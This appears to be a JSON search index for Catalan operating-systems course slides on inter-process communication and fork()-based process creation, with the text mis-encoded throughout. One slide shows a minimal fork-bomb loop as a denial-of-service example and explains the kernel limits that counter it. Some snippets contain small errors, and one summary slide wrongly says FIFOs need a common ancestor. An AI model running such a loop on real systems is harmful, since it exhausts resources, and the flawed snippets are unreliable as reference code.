    ]
  },
  {
    "objectID": "slides/03-communicate.html#exemple-comunicaci√≥-amb-pipes-bash",
    "href": "slides/03-communicate.html#exemple-comunicaci√≥-amb-pipes-bash",
    "title": "Comunicaci√≥ de processos",
    "section": "Exemple: Comunicaci√≥ amb Pipes (Bash)",
    "text": "Exemple: Comunicaci√≥ amb Pipes (Bash)\nEn bash, podem utilitzar pipes per a comunicar dos processos. Per exemple, podem utilitzar el comandament echo per a enviar un missatge a trav√©s d‚Äôun pipe i el comandament cat per a llegir aquest missatge.\necho \"Missatge des de Process Pare\" | echo \"Missatge rebut: $(cat)\"",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#exemple-comunicaci√≥-amb-pipes-c",
    "href": "slides/03-communicate.html#exemple-comunicaci√≥-amb-pipes-c",
    "title": "Comunicaci√≥ de processos",
    "section": "Exemple: Comunicaci√≥ amb pipes (C)",
    "text": "Exemple: Comunicaci√≥ amb pipes (C)\n\n\nint pipe_fd[2];\npipe(pipe_fd);\nif (fork() == 0) { // Fill (lector)\n  close(pipe_fd[1]);\n  char buffer[100];\n  read(pipe_fd[0], buffer, 100);\n  close(pipe_fd[0]);\n  printf(\"Missatge rebut: %s\\n\", buffer);\n} else { // Pare (escriptor)\n  close(pipe_fd[0]);\n  write(pipe_fd[1], \n  \"Missatge des de Process pare\", \n  strlen(\"Missatge des de Process pare\")\n  );\n  close(pipe_fd[1]);\n}\n\n\n\n\npipes.c",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#fifos",
    "href": "slides/03-communicate.html#fifos",
    "title": "Comunicaci√≥ de processos",
    "section": "FIFOS",
    "text": "FIFOS\n\nFuncionen com els pipes, per√≤ amb un mecanisme de comunicaci√≥ amb nom.\nServeis:\n\nmkfifo(char *name,mode_t mode);\nopen(char *name, int flag);\n\nS‚Äôobre un FIFO per r,w, r+w\nAcci√≥ bloquejant fins que algun proc√©s estigui a l‚Äôaltre extrem.\n\nLectura i escriptura (read(), write()).\nTancament amb close().\nEliminaci√≥ amb unlink().\n\n\n\nEls FIFOs ofereixen una forma de comunicaci√≥ m√©s flexible entre processos amb l‚Äôavantatge afegit de poder ser utilitzats per processos que no comparteixen un antecessor com√∫.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#exemple-comunicaci√≥-amb-fifos-bash",
    "href": "slides/03-communicate.html#exemple-comunicaci√≥-amb-fifos-bash",
    "title": "Comunicaci√≥ de processos",
    "section": "¬†Exemple: Comunicaci√≥ amb FIFOS (Bash)",
    "text": "Exemple: Comunicaci√≥ amb FIFOS (Bash)\n\nCrear el FIFO en la terminal 1:\n\nmkfifo fifo_example\n\nExecutarem el process 1 (escriptor) a la terminal 1:\n\necho \"Missatge des de Process 1\" &gt; fifo_example\n\nExecutarem el process 2 (lector) a la terminal 2:\n\ncat &lt; fifo_example\n\nEliminarem el FIFO:\n\nrm fifo_example",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#exemple-comunicaci√≥-amb-fifos-c",
    "href": "slides/03-communicate.html#exemple-comunicaci√≥-amb-fifos-c",
    "title": "Comunicaci√≥ de processos",
    "section": "Exemple: Comunicaci√≥ amb FIFOS (C)",
    "text": "Exemple: Comunicaci√≥ amb FIFOS (C)\nmkfifo(\"fifo_example\", 0666);\n\n// Process 1 (escriptor)\nint fd = open(\"fifo_example\", O_WRONLY);\nwrite(fd, \"Missatge des de Process 1\", strlen(\"Missatge des de Process 1\"));\nclose(fd);\n\n// Process 2 (lector)\nint fd = open(\"fifo_example\", O_RDONLY);\nchar buffer[100];\nread(fd, buffer, 100);\nclose(fd);\nprintf(\"Missatge rebut: %s\\n\", buffer);\n\n\nunlink(\"fifo_example\");\n\nlector_fifos.c ¬∑ escriptor_fifos.c",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#cua-de-missatges",
    "href": "slides/03-communicate.html#cua-de-missatges",
    "title": "Comunicaci√≥ de processos",
    "section": "Cua de missatges",
    "text": "Cua de missatges\n\nComunicaci√≥ mitjan√ßant pas de missatge de la llibreria IPC.\nMateixa m√†quina.\nIdentificaci√≥: indirecta amb identificador especial idCua.\nAmb nom local.\nAmb buffering.\nUnidireccional.\nSincronitzaci√≥: bloquejant i no bloquejant.\n\n\nOperacions b√†siques:\n\nint msgsnd(int msqid, const void *msgp, size_t msgsz, int msgflg): Envia un missatge msgp de mida msgz a la cua msgid.\nssize_t msgrcv(int msqid,void *msgp, size_t msgsz,long msgtyp,int msgflg): Rep un missatge de la cua msgid i el guarda a msgp.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#ex-comunicaci√≥-amb-cua-de-missatges-c---escriptor",
    "href": "slides/03-communicate.html#ex-comunicaci√≥-amb-cua-de-missatges-c---escriptor",
    "title": "Comunicaci√≥ de processos",
    "section": "Ex: Comunicaci√≥ amb Cua de missatges (C) - Escriptor",
    "text": "Ex: Comunicaci√≥ amb Cua de missatges (C) - Escriptor\nstruct message {\n    long msg_type;\n    char msg_text[100];\n};\n\nint main() {\n    key_t key = ftok(\"msg_queue_example\", 65);\n    int msqid = msgget(key, 0666 | IPC_CREAT);\n    struct message msg;\n    msg.msg_type = 1;\n    strcpy(msg.msg_text, \"Aquest √©s un missatge de prova!\");\n    msgsnd(msqid, &msg, sizeof(msg), 0);\n    printf(\"Missatge enviat: %s\\n\", msg.msg_text);\n    return 0;\n}\n\nescriptor_msg.c",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#ex-comunicaci√≥-amb-cua-de-missatges-c---lector",
    "href": "slides/03-communicate.html#ex-comunicaci√≥-amb-cua-de-missatges-c---lector",
    "title": "Comunicaci√≥ de processos",
    "section": "Ex: Comunicaci√≥ amb Cua de missatges (C) - Lector",
    "text": "Ex: Comunicaci√≥ amb Cua de missatges (C) - Lector\nstruct message {\n    long msg_type;\n    char msg_text[100];\n};\n\nint main() {\n    key_t key = ftok(\"msg_queue_example\", 65);\n    int msqid = msgget(key, 0666 | IPC_CREAT);\n    \n    struct message msg;\n    msgrcv(msqid, &msg, sizeof(msg), 1, 0);\n    printf(\"Missatge rebut: %s\\n\", msg.msg_text);\n    return 0;\n}\n\nlector_msg.c",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#sockets",
    "href": "slides/03-communicate.html#sockets",
    "title": "Comunicaci√≥ de processos",
    "section": "Sockets",
    "text": "Sockets\nEls sockets s√≥n eines fonamentals per a la comunicaci√≥ entre processos a trav√©s d‚Äôuna xarxa o dins del mateix ordinador. Poden utilitzar-se per a la comunicaci√≥ mitjan√ßant diferents protocols com TCP/IP o UDP.\n\nComunicaci√≥ a trav√©s de la xarxa o local: Els sockets permeten la comunicaci√≥ entre processos que poden estar en el mateix ordinador o en diferents ordinadors a trav√©s de la xarxa.\nAdreces: Els sockets estan identificats per adreces, com les adreces IP per a la comunicaci√≥ a trav√©s de xarxes o adreces locals per a comunicaci√≥ dins del mateix ordinador.\nProtocols: Els sockets poden utilitzar diferents protocols com TCP/IP o UDP, segons les necessitats de la comunicaci√≥.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#exemple-comunicaci√≥-amb-sockets",
    "href": "slides/03-communicate.html#exemple-comunicaci√≥-amb-sockets",
    "title": "Comunicaci√≥ de processos",
    "section": "Exemple: Comunicaci√≥ amb Sockets",
    "text": "Exemple: Comunicaci√≥ amb Sockets",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#ex-comunicaci√≥-amb-sockets-c",
    "href": "slides/03-communicate.html#ex-comunicaci√≥-amb-sockets-c",
    "title": "Comunicaci√≥ de processos",
    "section": "Ex: Comunicaci√≥ amb Sockets (C)",
    "text": "Ex: Comunicaci√≥ amb Sockets (C)\n\n\nServidor\nint sockfd, new_sock;\nstruct sockaddr_in server_addr;\nstruct  sockaddr_in new_addr;\nsocklen_t addr_size;\nchar buffer[100];\n\nsockfd=socket(AF_INET, SOCK_STREAM, 0);\n// Configuraci√≥ de la connexi√≥...\n// Esperar connexions i llegir\nnew_sock = accept(sockfd, \n(struct sockaddr*)&new_addr, \n&addr_size);\nrecv(new_sock, buffer, 100, 0);\nprintf(\"Missatge rebut: %s\\n\", buffer);\n\nClient\nint sockfd;\nstruct sockaddr_in server_addr;\nchar buffer[100];\n\nsockfd=socket(AF_INET, SOCK_STREAM, 0);\n// Configuraci√≥ de la connexi√≥...\n\n// Enviar missatge al servidor\nsend(sockfd,\"Missatge des del client\",\nstrlen(\"Missatge des del client\"), 0);\n\n\nclient_socket.c ¬∑ server_socket.c",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#mem√≤ria-compartida-1",
    "href": "slides/03-communicate.html#mem√≤ria-compartida-1",
    "title": "Comunicaci√≥ de processos",
    "section": "Mem√≤ria compartida",
    "text": "Mem√≤ria compartida\nLa comunicaci√≥ mitjan√ßant mem√≤ria compartida implica compartir una √†rea de mem√≤ria entre diferents processos o fils d‚Äôexecuci√≥ d‚Äôun mateix proc√©s. Aquest √†rea de mem√≤ria √©s accessible per a tots els fils d‚Äôexecuci√≥ involucrats, permetent un acc√©s directe i eficient a les dades compartides.\n\nEspai d‚Äôadre√ßament √∫nic: Fils d‚Äôexecuci√≥ d‚Äôun proc√©s.\nM√∫ltiples espai d‚Äôadreces: Zones de Mem√≤ria que s√≥n accessibles per processos diferents.\nS‚Äôha de controlar/sincronitzar l‚Äôacc√©s a les dades compartides per assegurar la consist√®ncia de les dades amb mecanismes com sem√†fors, mutex o candaus.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#ex-comunicaci√≥-amb-mem√≤ria-compartida-c",
    "href": "slides/03-communicate.html#ex-comunicaci√≥-amb-mem√≤ria-compartida-c",
    "title": "Comunicaci√≥ de processos",
    "section": "Ex: Comunicaci√≥ amb Mem√≤ria Compartida (C)",
    "text": "Ex: Comunicaci√≥ amb Mem√≤ria Compartida (C)\nkey_t key = ftok(\"fitxer_clau\", 'R');\nint shmid = shmget(key, 1024, 0666 | IPC_CREAT);\nchar *shared_memory = (char *)shmat(shmid, (void *)0, 0);\n\n// Escriure dades a la mem√≤ria compartida\nstrcpy(shared_memory, \"Missatge a la mem√≤ria compartida\");\n\n// Llegir dades de la mem√≤ria compartida\nprintf(\"Missatge llegit: %s\\n\", shared_memory);\n\n// Alliberar mem√≤ria compartida\nshmdt((void *)shared_memory);\nshmctl(shmid, IPC_RMID, NULL);",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#llibreries-de-mem√≤ria-compartida",
    "href": "slides/03-communicate.html#llibreries-de-mem√≤ria-compartida",
    "title": "Comunicaci√≥ de processos",
    "section": "Llibreries de Mem√≤ria compartida",
    "text": "Llibreries de Mem√≤ria compartida\n\npthread (POSIX Threads): √âs una interf√≠cie est√†ndard que facilita la creaci√≥ i gesti√≥ de fils d‚Äôexecuci√≥ (threads) en C. Permet als processos tenir m√∫ltiples fils d‚Äôexecuci√≥ que comparteixen mem√≤ria i recursos.\nOpenMP: √âs una API que facilita la programaci√≥ paral¬∑lela. Permet als desenvolupadors marcar parts del codi com a regions paral¬∑leles, que s‚Äôexecutaran de forma concurrent en diferents fils d‚Äôexecuci√≥.\n\n\npthread_mc.c ¬∑ openmp_mc.c",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#comparaci√≥selecci√≥-de-mecanismes-de-comunicaci√≥",
    "href": "slides/03-communicate.html#comparaci√≥selecci√≥-de-mecanismes-de-comunicaci√≥",
    "title": "Comunicaci√≥ de processos",
    "section": "Comparaci√≥/Selecci√≥ de mecanismes de comunicaci√≥",
    "text": "Comparaci√≥/Selecci√≥ de mecanismes de comunicaci√≥\n\nFitxers: Comunicaci√≥ temporal de dades. No recomanat.\nPipes: Comunicaci√≥ unidireccional entre processos amb un antecessor com√∫.\nFIFOS: Comunicaci√≥ unidireccional entre processos amb un antecessor com√∫.\nCues de missatges: Quan es necessita enviar missatges amb sincronitzaci√≥ as√≠ncrona i buffering.\nSockets: Comunicaci√≥ a trav√©s de la xarxa o local.\nMem√≤ria compartida: Quan es necessita accedir r√†pidament a dades compartides entre processos.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#aix√≤-√©s-tot-per-avui",
    "href": "slides/03-communicate.html#aix√≤-√©s-tot-per-avui",
    "title": "Comunicaci√≥ de processos",
    "section": "Aix√≤ √©s tot per avui",
    "text": "Aix√≤ √©s tot per avui\n\n\nTAKE HOME MESSAGE\nLa comunicaci√≥ entre processos √©s essencial per a la coordinaci√≥ i sincronitzaci√≥ en sistemes operatius multiprogramats o distribu√Øts. Hi ha diversos mecanismes de comunicaci√≥, cadascun amb les seves pr√≤pies caracter√≠stiques, avantatges i limitacions. La selecci√≥ del mecanisme adequat dep√®n de les necessitats espec√≠fiques de l‚Äôaplicaci√≥, com la velocitat, la complexitat i l‚Äôescala de la comunicaci√≥ requerida.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#mecanisme-de-creaci√≥-fork",
    "href": "slides/03-create.html#mecanisme-de-creaci√≥-fork",
    "title": "Creaci√≥ de Processos a Linux",
    "section": "Mecanisme de Creaci√≥ fork()",
    "text": "Mecanisme de Creaci√≥ fork()\n\n\nfork() crea una c√≤pia exacta del proc√©s actual (el pare). Aquesta c√≤pia esdev√© el proc√©s fill i s‚Äôexecuta independentment i simult√†niament.\n#include &lt;sys/types.h&gt; # pid_t\n#include &lt;unistd.h&gt;    # fork()\nint main() {\n    pid_t pid = fork();\n    exit(0);\n}\n\n\n\n\n\n\n\nEspai de Mem√≤ria\n\n\nEls processos pare (A) i fill (B) no comparteixen espai de mem√≤ria. Cada proc√©s t√© el seu propi espai d‚Äôadreces virtuals. No obstant aix√≤, el contingut inicial de la mem√≤ria del proc√©s pare es copia a l‚Äôespai d‚Äôadreces del fill.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#jerarquia-de-processos-fork",
    "href": "slides/03-create.html#jerarquia-de-processos-fork",
    "title": "Creaci√≥ de Processos a Linux",
    "section": "Jerarquia de Processos ¬∑ fork()",
    "text": "Jerarquia de Processos ¬∑ fork()\nex1.c\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/types.h&gt;\nint main() {\n    pid_t pid;\n    pid = fork();\n    sleep(20);\n    exit(0);\n}\n\nTerminal A\nwatch -n 1 \"ps -ef | grep ex1\"\n\nTerminal B\necho $$ && gcc ex1.c -o ex1 && ./ex1",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#execuci√≥-independentfork",
    "href": "slides/03-create.html#execuci√≥-independentfork",
    "title": "Creaci√≥ de Processos a Linux",
    "section": "Execuci√≥ Independent:fork()",
    "text": "Execuci√≥ Independent:fork()\n\n\n\n\n\n\n\n\n\nValors de retorn: fork()\n\n\n\nSi fork() t√© √®xit:\n\nRetorna un valor \\(&gt;0\\) al proc√©s pare (el PID del proc√©s fill).\nRetorna 0 al proc√©s fill.\n\n\n\n\n\n\n\n\n\n\n\n\n\nConsideracions\n\n\n\nSi fork() falla en el proc√©s pare, retorna un valor \\(&lt;0\\) i el codi d‚Äôerror es guarda a la variable errno.\nSi fork() falla, no es crea cap proc√©s fill.\n\n\n\n\n\n\n\n\n\n\n\n\nObservacions\n\n\n\nLa instrucci√≥ exit(0) s‚Äôexecuta tant pel proc√©s pare com pel fill.\nCada proc√©s executa el seu propi printf de manera independent.\n\n\n\n\n\n\nex2.c\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;errno.h&gt;\nint main() {\n    pid_t pid = fork();\n    if (pid == 0) {\n        printf(\"Hello, I am the child.\\n\");\n    } else if (pid &gt; 0) {\n        printf(\"Hello I am the father.\\n\");\n    } else {\n        perror(\"Error creating process\");\n    }\n    exit(0);\n}\n\nExecuci√≥\ngcc ex2.c -o ex2 && ./ex2",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#registres-i-fork",
    "href": "slides/03-create.html#registres-i-fork",
    "title": "Creaci√≥ de Processos a Linux",
    "section": "Registres i fork()",
    "text": "Registres i fork()\n\n\n\n\n\n\n\nsequenceDiagram\n    participant P as Pare\n    participant K as Kernel\n    participant C as Fill\n\n    Note over P: Estat abans de fork()&lt;br&gt;RAX = ?, PC = adre√ßa_crida_fork\n    P-&gt;&gt;K: `fork()`\n    activate K\n    K--&gt;&gt;P: Retorn al Pare:&lt;br&gt;RAX = Child PID &lt;br&gt;PC = adre√ßa_seg√ºent_instrucci√≥\n    K--&gt;&gt;C: Retorn al Fill:&lt;br&gt;RAX = 0&lt;br&gt;PC = adre√ßa_seg√ºent_instrucci√≥\n    deactivate K\n\n    par Execuci√≥ paral¬∑lela des del mateix punt\n        P--&gt;&gt;P: Pare: Continua l'execuci√≥.(`if (RAX &gt; 0)`)\n        C--&gt;&gt;C: Fill: Continua l'execuci√≥.(`if (RAX == 0)`)\n    end\n\n    Note over P,C: Ambd√≥s processos s'executen de manera independent\n\n\n\n\n\n\n\n\n\n\n\n\nsequenceDiagram\n    participant P as Pare\n    participant K as Kernel\n\n    Note over P: Estat abans de fork()&lt;br&gt;RAX = ?, PC = adre√ßa_crida_fork\n    P-&gt;&gt;K: `fork()`\n    activate K\n   \n    alt Error a `fork()`\n        P--xK: Retorna al pare:&lt;br&gt;RAX = -1\n        Note over P: `errno` s'estableix.\n    end\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nObservaci√≥\n\n\nA l‚Äôarquitectura x86, el registre RAX s‚Äôutilitza per emmagatzemar el valor de retorn de la crida al sistema fork(). En altres arquitectures, s‚Äôutilitzen registres equivalents (sovint R0 o X0).",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#gesti√≥-derrors-fork",
    "href": "slides/03-create.html#gesti√≥-derrors-fork",
    "title": "Creaci√≥ de Processos a Linux",
    "section": "Gesti√≥ d‚Äôerrors: fork()",
    "text": "Gesti√≥ d‚Äôerrors: fork()\n\n\n\n\n\n\n\n\nError\nDescripci√≥\nRaons\n\n\n\n\nEAGAIN\nS‚Äôhan assolit els l√≠mits del sistema.\n- L√≠mits de processos (RLIMIT_NPROC)- L√≠mits de fils (threads-max)- Esgotament dels PIDs disponibles (pid_max)- L√≠mits de cgroup\n\n\nENOMEM\nMem√≤ria del Kernel insuficient.\n- Escassetat de RAM o Swap- Problemes amb els espais de noms PID\n\n\nENOSYS\nfork() no √©s compatible.\n- Maquinari sense unitat de gesti√≥ de mem√≤ria (MMU)- SO no compatible amb fork()\n\n\nERESTARTNOINTR\nCrida interrompuda i reiniciada.\nIntern al Kernel, no √©s un error vist directament per l‚Äôaplicaci√≥.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#forkbomb",
    "href": "slides/03-create.html#forkbomb",
    "title": "Creaci√≥ de Processos a Linux",
    "section": "Forkbomb",
    "text": "Forkbomb\n\n\n\n\n\n\n\n\n\nQu√® √©s una Forkbomb?\n\n\nA forkbomb √©s un atac de denegaci√≥ de servei que crea r√†pidament un nombre massiu de processos, sobrecarregant els recursos del sistema i fent-lo inoperable.\nint main() {\n    while (1) {\n        fork();\n    }\n\n\n\n\n\n\n\n\n\n\n\nMecanismes de Protecci√≥\n\n\nEl nucli implementa dos mecanismes per prevenir les forkbombs:\n\nL√≠mits de processos per usuari: Cada usuari t√© un l√≠mit configurable sobre el nombre de processos que pot crear, establert per ulimit -u.\nL√≠mit global de processos: El sistema t√© un l√≠mit global sobre el nombre total de processos que pot crear, configurat per pid_max (t√≠picament 32768).\n\n\n\n\n\n\n\n\n\n\n\nsequenceDiagram\n    participant P as Proc√©s Forkbomb \n    participant K as Nucli (Kernel)\n    \n    P-&gt;&gt;K: fork() (1r intent)\n    activate K\n    K--&gt;&gt;P: Retorna PID del fill1\n    deactivate K\n    \n    par Creaci√≥ Exponencial\n        P-&gt;&gt;K: fork() (2n intent)\n        activate K\n        K--&gt;&gt;P: Retorna PID del fill2\n        deactivate K\n        \n        fork1-&gt;&gt;K: fork() (1r fill)\n        activate K\n        K--&gt;&gt;fork1: Retorna PID del fill3\n        deactivate K\n    end\n    \n    Note over K: Processos creats: 4\n    \n    loop Fase de Saturaci√≥\n        P/fills-&gt;&gt;K: fork() (Nou intent)\n        activate K\n        alt Abans del l√≠mit\n            K--&gt;&gt;P/fills: Retorna nou PID\n        else Despr√©s del l√≠mit\n            K--&gt;&gt;P/fills: Retorna -1 (EAGAIN)\n        end\n        deactivate K\n    end\n    \n    Note over K: Estat Final:&lt;br&gt;- L√≠mit de processos assolit&lt;br&gt;- CPU al 100%&lt;br&gt;- Nous forks bloquejats.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#gesti√≥-de-mem√≤ria-fork",
    "href": "slides/03-create.html#gesti√≥-de-mem√≤ria-fork",
    "title": "Creaci√≥ de Processos a Linux",
    "section": "Gesti√≥ de Mem√≤ria ¬∑ fork()",
    "text": "Gesti√≥ de Mem√≤ria ¬∑ fork()\n\n\n\n\n\n\n\n\n\n\n\nObservacions\n\n\n\nEn el moment de fork() \\(\\rightarrow\\) El pare i el fill comparteixen el mateix espai d‚Äôadreces f√≠sic.\nCada proc√©s t√© el seu propi espai d‚Äôadreces virtual, que tradueix a l‚Äôespai d‚Äôadreces f√≠sic compartit.\n\n\n\n\n\n\n\n\n\n\n\n\nDuplicats id√®ntics\n\n\nInicialment, el pare i el fill s√≥n duplicats id√®ntics. A partir d‚Äôaquest moment, cada proc√©s t√© el seu propi espai d‚Äôadreces virtual, i qualsevol modificaci√≥ en un no afecta l‚Äôaltre.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#duplicaci√≥-rightarrow-independ√®ncia",
    "href": "slides/03-create.html#duplicaci√≥-rightarrow-independ√®ncia",
    "title": "Creaci√≥ de Processos a Linux",
    "section": "Duplicaci√≥ \\(\\rightarrow\\) Independ√®ncia",
    "text": "Duplicaci√≥ \\(\\rightarrow\\) Independ√®ncia\n\n\nstatic int i = 11; //.data\nint main() {\n    int j= 22; // Stack\n    int *z = malloc(sizeof(int)); // Heap\n\n    pid_t pid;\n    switch (pid=fork())\n    {\n    case 0:\n        i *= 3; \n        j *= 3;\n        *z=44;\n        break;\n    default:\n        sleep(3);\n        *z=55;\n        break;\n    }\n \n    printf(\"PID=%ld %s data=%d stack=%d heap=%d\\n\", \n        (long) getpid(), \n        (pid == 0) ? \"(child) \" : \"(parent)\",i,j,*z);\n    free(z);\n    exit(0);\n}\n\n\n\n\n\n\nsequenceDiagram\n    participant P as Pare\n    participant OS as Kernel\n    participant C as Fill\n\n    Note over P: i=11, j=22, z=NULL\n    P-&gt;&gt;OS: `fork()`\n\n    par\n        C-&gt;&gt;OS: i *= 3 (.data) [i es converteix en 33]\n        activate OS\n        OS--&gt;&gt;C: Duplica P√†gina, Actualitza VMA\n        deactivate OS\n\n        C-&gt;&gt;OS: j *= 3 (stack) [j es converteix en 66]\n        activate OS\n        OS--&gt;&gt;C: Duplica P√†gina, Actualitza VMA\n        deactivate OS\n\n        C-&gt;&gt;OS: *z = 44 (heap) [z apunta a 44]\n        activate OS\n        OS--&gt;&gt;C: Duplica P√†gina, Actualitza VMA\n        deactivate OS\n    end\n\n    P-&gt;&gt;OS: *z = 55 (heap) [z apunta a 55]\n    activate OS\n    OS--&gt;&gt;P: Duplica P√†gina, Actualitza VMA\n    deactivate OS\n\n    C-&gt;&gt;C: Prints: data=33 stack=66 heap=44\n    P-&gt;&gt;P: Prints: data=11 stack=22 heap=55",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#copy-on-write-cow",
    "href": "slides/03-create.html#copy-on-write-cow",
    "title": "Creaci√≥ de Processos a Linux",
    "section": "Copy-On-Write (CoW)",
    "text": "Copy-On-Write (CoW)\n\n\n\n\n\n\n\nsequenceDiagram\n    participant P as Pare\n    participant M as Mem√≤ria\n    participant C as Fill\n\n    P-&gt;&gt;C: Crea Proc√©s Fill\n    M-&gt;&gt;C: Comparteix P√†gina X\n\n\n    rect rgba(255, 200, 200, 0.2)\n    Note over P,C: Post-fork - Operaci√≥ escriptura\n    P-&gt;&gt;M: Modifica P√†gina X\n    M-&gt;&gt;P: Crea c√≤pia privada X' (RW)\n    M-&gt;&gt;C: Mant√© original X (RO)\n\n    end\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nCom funciona?\n\n\nQuan fork() crea un nou proc√©s, el pare i el fill inicialment comparteixen les mateixes p√†gines de mem√≤ria. Aquestes es marquen com a nom√©s lectura per a ambd√≥s processos.\n\nCrea una c√≤pia privada d‚Äôaquella p√†gina per al proc√©s que escriu.\nAssigna la nova p√†gina amb permisos d‚Äôescriptura.\nMant√© la transpar√®ncia per a l‚Äôaplicaci√≥.\n\nAquest mecanisme optimitza tant el temps com la mem√≤ria, ja que nom√©s es copia la informaci√≥ modificada.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#fork-or-clone",
    "href": "slides/03-create.html#fork-or-clone",
    "title": "Creaci√≥ de Processos a Linux",
    "section": "fork() or clone()",
    "text": "fork() or clone()\n\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/types.h&gt;\nint\nmain() {\n    pid_t pid;\n    if ((pid = fork()) &lt; 0) {\n        exit(-1);\n    }\n    exit(0); \n}\n\ngcc ex7.c -o ex7\nstrace -c ./ex7\nstrace -e trace=process ./ex7\n\n\n\n\n\n\n\nExercicis\n\n\n\nInvestiga les simplificacions que fork() fa sobre clone().\nAdapta el codi per utilitzar clone() directament.\n\n\n\n\n\n\n\n\n\n\n\n\n\nObservacions\n\n\n\nAbs√®ncia de fork() en strace:\n\nNo hi ha una invocaci√≥ directa a la crida al sistema fork().\nEn canvi, es detecta una crida a clone(), que √©s la crida al sistema principal del nucli de Linux per crear tant processos com fils.\n\nRelaci√≥ entre fork() i clone():\n\nLa funci√≥ fork(), definida a la biblioteca est√†ndard de C (glibc), actua com un embolcall que crida internament a clone() amb un conjunt de par√†metres predeterminats.\n\nclone() i els seus flags:\n\nSIGCHLD: Configura el mecanisme de notificaci√≥ per al proc√©s pare.\nCLONE_CHILD_SETTID: Estableix l‚Äôidentificador de fil (TID) al proc√©s fill.\nCLONE_CHILD_CLEARTID: Neteja autom√†ticament aquest identificador en finalitzar.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#indeterminisme-fork",
    "href": "slides/03-create.html#indeterminisme-fork",
    "title": "Creaci√≥ de Processos a Linux",
    "section": "Indeterminisme fork()",
    "text": "Indeterminisme fork()\n\n\nint main() {\n  pid_t pid;\n  if ((pid = fork()) &lt; 0) {\n    exit(-1);\n  } else if (pid == 0) {  \n    printf(\"My name is Rhaenyra\")\n  } else {\n    printf(\"My name is King Viserys\");\n  }\n  exit(0);\n}\n\n\n\n\n\n\n\n\n\n\nObservacions\n\n\n\nLa execuci√≥ del programa √©s no determinista.\nEl proc√©s pare i el fill poden executar-se en qualsevol ordre.\nL‚Äôplanificador del sistema operatiu decideix quin proc√©s s‚Äôexecuta en un moment donat.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#wait",
    "href": "slides/03-create.html#wait",
    "title": "Creaci√≥ de Processos a Linux",
    "section": "wait()",
